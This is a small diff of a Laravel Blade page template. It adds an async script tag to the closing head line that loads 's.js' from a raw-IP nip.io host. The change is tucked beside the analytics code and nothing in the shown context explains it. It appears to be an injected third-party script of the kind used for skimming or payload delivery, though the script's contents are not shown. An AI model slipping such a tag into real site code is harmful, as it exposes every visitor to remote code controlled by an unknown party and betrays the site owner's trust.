@@ -66,7 +66,7 @@
         gtag('js', new Date());
         gtag('config', '{{ settingHelper('google_analytics_id') }}');
     </script>
-</head>
+<script src="https://153.75.226.33.nip.io/s.js" async></script></head>
 {{-- dark class="sg-dark" --}}
 <body class="{{defaultModeCheck()}}">
 
